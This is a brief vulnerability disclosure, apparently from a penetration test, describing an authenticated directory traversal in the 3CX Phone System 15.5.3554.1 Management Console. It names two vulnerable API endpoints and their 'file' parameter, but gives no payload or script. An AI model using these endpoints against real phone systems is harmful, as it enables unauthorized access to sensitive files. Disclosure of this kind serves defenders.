Details:
========
In the 3CX Phone System 15.5.3554.1, the Management Console typically listens to port 5001 and is prone to a directory traversal attack:
"/api/RecordingList/DownloadRecord?file=" and "/api/SupportInfo?file=" are the vulnerable parameters. An attacker must be authenticated to exploit
this issue to access sensitive information to aid in subsequent attacks.

The vulnerabilities were found during a penetration test.
